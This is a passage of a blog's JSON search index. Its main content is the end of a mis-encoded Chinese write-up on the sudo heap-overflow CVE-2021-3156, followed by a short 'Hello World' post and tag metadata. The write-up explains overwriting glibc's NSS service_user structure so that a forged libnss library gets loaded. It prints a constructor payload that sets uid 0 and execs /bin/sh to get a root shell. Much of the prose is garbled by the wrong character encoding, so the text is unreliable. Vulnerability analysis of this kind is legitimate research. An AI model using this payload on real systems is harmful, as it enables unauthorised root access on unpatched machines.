·çš„ä¸€å¥—ç§°ä¹‹ä¸ºNSSçš„å…±äº«åº“æ¥åšä¸€äº›è§£æï¼Œæ¯”å¦‚ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åä»¥åŠIPåœ°å€åˆ°åŸŸåçš„è§£æã€‚æ¯”å¦‚å¯¹äºDNSæœåŠ¡æ¥è¯´ï¼Œå®ƒé»˜è®¤æŸ¥çœ‹/etc/resolv.confé…ç½®æ–‡ä»¶çš„å†…å®¹è¿›è¡Œè§£æï¼Œå¯¹äºç”¨æˆ·å’Œç»„æ¥è¯´ï¼Œå®ƒä¼šé»˜è®¤æŸ¥çœ‹/etc/passwdå’Œ/etc/groupã€‚å…¶é…ç½®æ–‡ä»¶ä½äº/etc/nsswitch.confï¼Œå…¶æ¯è¡Œéƒ½è§„å®šäº†æŸ¥æ‰¾æ–¹æ³•çš„è§„èŒƒï¼Œåœ¨GNU C Libraryé‡Œ, æ¯ä¸ªå¯ç”¨çš„SERVICEéƒ½å¿…é¡»æœ‰æ–‡ä»¶ /lib/libnss_SERVICE.so.1 ä¸ä¹‹å¯¹åº”ã€‚****ä¹Ÿå°±æ˜¯è¯´ï¼ŒGNUå°†æ¯ä¸ªæœåŠ¡å®ç°ä¸ºä¸åŒçš„module(shared library)ï¼Œå› æ­¤å¯ä»¥åœ¨Linuxç³»ç»Ÿä¸­æ‰¾åˆ°ä¸‹åˆ—ç›¸åº”çš„å…±äº«åº“ã€‚** 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 1. service_user ç»“æ„typedef struct service_user&#123;/* And the link to the next entry. */struct service_user *next;/* Action according to result. */lookup_actions actions[5];/* Link to the underlying library object. */service_library *library;/* Collection of known functions. */void *known;/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...). */char name[0];&#125; service_user;// 2. nss_load_library() å‡½æ•°static int nss_load_library (service_user *ni)&#123;if (ni-&gt;library == NULL) &#123; static name_database default_table; ni-&gt;library = nss_new_service (service_table ?: &amp;default_table, // ï¼ˆ1ï¼‰è®¾ç½® ni-&gt;library ni-&gt;name); if (ni-&gt;library == NULL) return -1; &#125;if (ni-&gt;library-&gt;lib_handle == NULL) &#123; /* Load the shared library. */ size_t shlen = (7 + strlen (ni-&gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, // ï¼ˆ2ï¼‰ä¼ªé€ çš„åº“æ–‡ä»¶åå¿…é¡»æ˜¯ libnss_xxx.so &quot;libnss_&quot;), ni-&gt;name), &quot;.so&quot;), __nss_shlib_revision); ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); // ï¼ˆ3ï¼‰åŠ è½½ç›®æ ‡åº“ //continue long long function åˆ†æä»£ç å¯çŸ¥ï¼šå¦‚æœæº¢å‡ºåå¯ä»¥è¦†ç›–service_userç»“æ„ã€‚è¯¥ç»“æ„å‡ºç°åœ¨libcçš„nss_load_library()å‡½æ•°ä¸­ï¼Œç”¨äºåŠ è½½åŠ¨æ€é“¾æ¥åº“ã€‚å¦‚æœèƒ½è¦†ç›–service_user-&gt;nameï¼Œå°±èƒ½æŒ‡å®šåŠ è½½æˆ‘ä»¬ä¼ªé€ çš„åº“ï¼Œåˆ©ç”¨rootæƒé™è¿è¡Œérootæƒé™çš„åº“ã€‚ æˆ‘ä»¬è¦åšçš„å°±æ˜¯åˆ©ç”¨æº¢å‡ºéƒ¨åˆ†å°†ni-&gt;library == nullï¼Œæ‰€ä»¥æ‰¾åˆ°è·ç¦»æˆ‘ä»¬å ä½å—æœ€è¿‘çš„ä¸€ä¸ªservice_userç»“æ„ä½“å³å¯ã€‚ gdbè°ƒè¯•æŠ€å·§ï¼š search -s systemd å’Œ search -s mymachine å®šä½å‡ºç°çš„ç»“æ„ä½“ï¼Œæ‰¾åˆ°ä½ç½®æœ€åˆé€‚çš„ä¸€ä¸ªã€‚ Demo: æœ€åä¸€æ­¥ï¼šä¼ªé€ libnss_X/X.so.2åº“ Demo: 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;static int __attribute__((constructor)) ___init(void)&#123; char *argv[2] = &#123;&quot;sh&quot;, NULL&#125;; setuid(0); setgid(0); seteuid(0); setegid(0); return execve(&quot;/bin/sh&quot;, argv, NULL);&#125; åŠ è½½è¯¥åº“å‡½æ•°å³å¯get shell. æ€»ç»“åŸºæœ¬æ€è·¯æ˜¯ï¼šé€šè¿‡è¾“å…¥ç‰¹å®šç¯å¢ƒå˜é‡ï¼Œä½¿å¾—é‡Šæ”¾ç‰¹å®šå¤§å°LC_ALLå˜é‡å †å—å ä½åˆ°service_userç»“æ„ä½“ä¸Šæ–¹ä¸ºç›®æ ‡æ¥è¿›è¡Œï¼Œä½¿å¾—serviceç»“æ„ä½“åŠ è½½è‡ªå®šä¹‰åº“å‡½æ•°ã€‚ åœ¨é˜…è¯»Qualysçš„æŠ¥å‘Šæ—¶æ³¨æ„åˆ°ï¼Œåœ¨å¯»æ‰¾åˆ©ç”¨ç‚¹æ—¶ä½¿ç”¨äº†fuzzçš„æ–¹æ³•ï¼Œæ‰¾åˆ°äº†ä¸‰ä¸ªè¾ƒä¸ºç¨³å®šçš„åˆ©ç”¨ç‚¹ï¼Œè¿™ç‚¹å€¼å¾—ä»¥åæ·±å…¥äº†è§£ã€‚","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"å †æº¢å‡º","slug":"å †æº¢å‡º","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"}]},{"title":"Hello World","slug":"hello_world","date":"2021-04-08T03:20:01.320Z","updated":"2021-04-08T17:06:24.341Z","comments":true,"path":"2021/04/08/hello_world/","link":"","permalink":"http://example.com/2021/04/08/hello_world/","excerpt":"","text":"ä¸€ä¸ªæ–°çš„å¼€å§‹ â€œæˆ‘æ‰€æœ‰çš„æ¬²æœ›å’Œæ²‰æ€ï¼Œéƒ½æ˜¯è¿™ä¸ªå®‡å®™ç¼“ç¼“å‘¼å‡ºçš„æ°”æµã€‚åœ¨è¿™æ¼«é•¿çš„å‘¼æ°”ç»“æŸä¹‹å‰ï¼Œæˆ‘çš„æ€ç»´å°†ä¸€ç›´å­˜åœ¨ã€‚â€ â€‹ å‡ ç»å‘¨æŠ˜ç»ˆäºé¢å‰æ­å»ºå¥½äº†å±äºè‡ªå·±çš„åšå®¢ï¼Œä¸€ä¸ªå±äºè‡ªå·±çš„ç©ºé—´ã€‚é•¿ä¹…ä»¥æ¥ï¼Œæˆ‘ä¸å¤–ç•Œçš„å…³ç³»æ˜¯ä½œä¸ºä¸€ä¸ªæ¶ˆè´¹è€…ï¼Œæ¶ˆè´¹ç‰©è´¨å’Œå†…å®¹ã€‚2021å¹´å¸Œæœ›è‡ªå·±å¯ä»¥åšä¸€ä¸ªç”Ÿäº§è€…ï¼Œåˆ›ä½œè€…ï¼ŒæŠŠåšå®¢ä½œä¸ºæ–¹æ³•ï¼Œè¾“å‡ºå’Œè®°å½•ä¸€äº›å†…å®¹ã€‚ :) Hello world.","categories":[{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}],"categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"},{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"ç¨‹åºä¿æŠ¤æœºåˆ¶","slug":"ç¨‹åºä¿æŠ¤æœºåˆ¶","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"name":"ç¼–è¯‘è¿‡ç¨‹","slug":"ç¼–è¯‘è¿‡ç¨‹","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"é“¾æ¥","slug":"é“¾æ¥","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"},{"name":"å †æº¢å‡º","slug":"å †æº¢å‡º","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"},{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}